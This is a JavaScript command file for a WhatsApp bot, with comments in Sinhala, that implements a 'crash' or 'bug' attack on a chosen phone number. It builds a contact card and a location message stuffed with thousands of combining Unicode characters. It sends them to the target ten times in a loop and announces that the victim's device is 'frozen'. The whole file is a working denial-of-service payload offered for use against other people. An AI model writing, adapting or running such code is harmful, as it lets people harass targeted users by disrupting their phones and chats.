const { cmd } = require('../command');

cmd({
    pattern: "bug",
    alias: ["crash", "dead", "hashulag"],
    desc: "Powerful WhatsApp Crash for Railway",
    category: "owner",
    react: "☣️",
    filename: __filename
},
async (conn, mek, m, { from, isOwner, reply, args, senderNumber }) => {
    try {
        // --- අවසර ලත් අංක (Whitelist) ---
        const authorizedNumbers = ['94740137623']; // මෙතනට ඔයාගේ අංකය දාන්න
        const isAuthorized = authorizedNumbers.includes(senderNumber) || isOwner;
        if (!isAuthorized) return;

        if (!args[0] && !m.quoted) return reply("කරුණාකර අංකයක් දෙන්න! ❌");

        let target = m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";

        reply("☣️ *Railway System:* Deploying High-Power Crash Payload... 🚀");

        // 1. අතිශය බර වැඩි vCard එකක් (Contact Bug)
        const vcard = 'BEGIN:VCARD\n' +
            'VERSION:3.0\n' +
            'FN:HASHU-LAG DEAD 💀\n' +
            'ORG:HASHAN-MD-V1;\n' +
            'TEL;type=CELL;type=VOICE;waid=94712345678:+94 71 234 5678\n' +
            'X-ABLabel:' + "\u0345\u0361\u0345".repeat(2000) + '\n' + 
            'END:VCARD';

        // 2. Location Bug එක (මේකෙන් තමයි චැට් එක හිර වෙන්නේ)
        const locPayload = {
            degreesLatitude: 24.121231,
            degreesLongitude: 55.112122,
            name: "HASHU-LAG V1 ☣️\n" + "҉".repeat(2000),
            address: "\u0345\u0361\u0345".repeat(1000)
        };

        // Railway එකේදී Error නොවෙන්න අපිට එකපාර මැසේජ් 10ක් විතර යවන්න පුළුවන්
        for (let i = 0; i < 10; i++) {
            // Contact Bug එක යැවීම
            await conn.sendMessage(target, {
                contacts: {
                    displayName: 'HASHU-LAG ☣️',
                    contacts: [{ vcard }]
                }
            }, { quoted: mek });

            // Location Bug එක යැවීම
            await conn.sendMessage(target, {
                location: locPayload
            }, { quoted: mek });

            // Railway නිසා ඩිලේ එක තත්පර 1ක් තිබුණම ඇති
            await new Promise(resolve => setTimeout(resolve, 1000));
        }

        reply("✅ *SUCCESS:* Target device is now frozen. Check status! 💀");

    } catch (e) {
        console.log("Bug Deploy Error: ", e.message);
    }
});
